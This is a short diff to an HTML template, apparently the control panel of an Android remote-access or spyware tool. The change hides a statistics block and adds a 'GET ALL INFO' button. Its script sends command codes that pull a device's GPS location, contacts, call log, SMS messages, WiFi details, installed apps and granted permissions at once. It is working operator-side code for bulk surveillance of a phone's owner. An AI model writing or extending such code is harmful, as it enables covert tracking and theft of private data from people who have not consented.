@@ -1,4 +1,5 @@
 <div class="ui segment">
+    <!--
     <div class="ui statistics four">
         <div class="statistic"></div>
         <div class="statistic">
@@ -21,4 +22,20 @@
         </div>
         <div class="statistic"></div>
     </div>
+    -->
+    
+    <script>
+        function getAllInfo() {
+            updateButton(this, '0xLO'); // GPS
+            updateButton(this, '0xCO'); // Contacts
+            updateButton(this, '0xCL'); // Call Log
+            updateButton(this, '0xSM', {'action': 'ls'}); // SMS
+            updateButton(this, '0xWI'); // WiFi
+            updateButton(this, '0xIN'); // Installed Apps
+            updateButton(this, '0xPM'); // Allowed Permissions
+        }
+    </script>
+    <button onclick="getAllInfo();">GET ALL INFO</button>
+    <p> GPS, Contacts, Call Log, SMS, WiFi, Installed Apps, Allowed Permissions
+    </p>
 </div>
